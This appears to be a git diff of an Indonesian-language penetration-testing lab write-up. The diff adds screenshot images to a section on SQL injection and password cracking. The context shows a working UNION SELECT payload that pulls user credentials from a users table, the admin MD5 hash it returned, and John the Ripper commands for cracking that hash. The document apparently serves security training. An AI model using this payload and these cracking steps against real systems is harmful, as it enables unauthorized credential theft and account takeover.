@@ -64,6 +64,8 @@ Ditemukan bahwa parameter `id` tidak divalidasi sebagai angka (Integer). Dengan 
 2.  **Pencurian Data (Data Exfiltration):**
     Menggunakan teknik *UNION SELECT* untuk menggabungkan hasil query asli dengan data dari tabel `users`. ID diubah menjadi `999` (invalid) agar aplikasi menampilkan data curian kita di baris pertama.
     * **Payload (Burp Suite):**
+    * <img width="650" height="216" alt="Screenshot 2025-11-27 201219" src="https://github.com/user-attachments/assets/d49b1008-5cb8-45e8-933b-7d97473d642c" />
+
       ```text
       id=999+UNION+SELECT+user,password+FROM+users+%23
       ```
@@ -71,7 +73,8 @@ Ditemukan bahwa parameter `id` tidak divalidasi sebagai angka (Integer). Dengan 
       * User: `admin`
       * Password Hash: `5f4dcc3b5aa765d61d8327deb882cf99`
 
-![Screenshot Hasil SQL Injection](Link_Gambar_Hasil_SQLi_Admin.png)
+
+<img width="798" height="619" alt="Screenshot 2025-11-27 202147" src="https://github.com/user-attachments/assets/2aac09b6-9990-41ac-9fb7-501cf9873446" />
 
 ### 2. Post-Exploitation (Password Cracking)
 
@@ -81,3 +84,8 @@ Password yang didapatkan masih dalam bentuk enkripsi satu arah (MD5 Hash). Untuk
 ```bash
 echo "5f4dcc3b5aa765d61d8327deb882cf99" > admin_pass.txt
 john --format=Raw-MD5 admin_pass.txt
+```
+<img width="632" height="158" alt="Screenshot 2025-11-27 201447" src="https://github.com/user-attachments/assets/d02e0121-abbe-4ee7-b476-7569d21e6704" />
+
+<img width="636" height="299" alt="Screenshot 2025-11-27 201726" src="https://github.com/user-attachments/assets/ad47692f-bad0-4c02-b4c0-b4ea996604de" />
+
